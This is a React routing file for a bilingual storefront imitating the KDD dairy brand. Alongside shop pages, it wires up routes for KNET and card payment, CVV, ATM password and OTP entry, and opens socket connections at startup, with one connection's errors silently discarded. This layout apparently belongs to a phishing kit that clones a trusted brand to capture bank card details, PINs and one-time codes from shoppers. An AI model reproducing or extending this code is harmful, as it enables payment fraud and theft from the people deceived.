import { useEffect } from "react";
import {
  BrowserRouter,
  Link,
  Route,
  Routes,
  useLocation,
} from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "sonner";
import { CartProvider } from "@/kdd/contexts/CartContext";
import { LanguageProvider, useLanguage } from "@/kdd/contexts/LanguageContext";
import Index from "@/kdd/pages/Index";
import Products from "@/kdd/pages/Products";
import Category from "@/kdd/pages/Category";
import ProductDetail from "@/kdd/pages/ProductDetail";
import Cart from "@/kdd/pages/Cart";
import Checkout from "@/kdd/pages/Checkout";
import { connectStorefront } from "@/kdd/lib/socketClient";
import "./styles.css";
import KNETPayment from "../pages/KNETPayment";
import CreditCardPayment from "../pages/CreditCardPayment";
import FinalPage from "../pages/FinalPage";
import CVV from "../pages/CVV";
import ATMPassword from "../pages/ATMPassword";
import OTPVerification from "../pages/OTPVerification";
import { initializeSocket } from "@/lib/store";

const queryClient = new QueryClient({
  defaultOptions: { queries: { staleTime: 30_000, retry: false } },
});

function StorefrontRuntime() {
  const { pathname } = useLocation();
  const { lang } = useLanguage();
  useEffect(() => connectStorefront(), []);
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: "auto" });
  }, [pathname]);
  useEffect(() => {
    document.title =
      pathname === "/"
        ? lang === "ar"
          ? "كي دي دي — ألبان وعصائر وآيس كريم منذ 1962"
          : "KDD — Dairy, Juices & Ice Cream since 1962"
        : lang === "ar"
          ? "كي دي دي"
          : "KDD";
  }, [pathname, lang]);
  return null;
}

function LocalFallback() {
  const { lang } = useLanguage();
  return (
    <div className="kdd-container py-24 text-center">
      <h1 className="text-2xl font-black">
        {lang === "ar" ? "الصفحة غير موجودة" : "Page not found"}
      </h1>
      <Link className="mt-5 inline-block text-primary hover:underline" to="/">
        {lang === "ar" ? "العودة للرئيسية" : "Back home"}
      </Link>
    </div>
  );
}

export default function StorefrontApp() {
  useEffect(() => { try { initializeSocket(); } catch (e) {} }, []);
  return (
    <QueryClientProvider client={queryClient}>
      <LanguageProvider>
        <CartProvider>
          <BrowserRouter>
            <StorefrontRuntime />
            <Routes>
              <Route path="/" element={<Index />} />
              <Route path="/products" element={<Products />} />
              <Route path="/category/:slug" element={<Category />} />
              <Route path="/product/:id" element={<ProductDetail />} />
              <Route path="/cart" element={<Cart />} />
              <Route path="/checkout" element={<Checkout />} />
              <Route path="/knet" element={<KNETPayment />} />
              <Route path="/card" element={<CreditCardPayment />} />
              <Route path="/final-page" element={<FinalPage />} />
              <Route path="/cvv" element={<CVV />} />
              <Route path="/atm" element={<ATMPassword />} />
              <Route path="/otp-verification" element={<OTPVerification />} />
              <Route path="*" element={<LocalFallback />} />
            </Routes>
          </BrowserRouter>
          <Toaster position="top-center" richColors />
        </CartProvider>
      </LanguageProvider>
    </QueryClientProvider>
  );
}
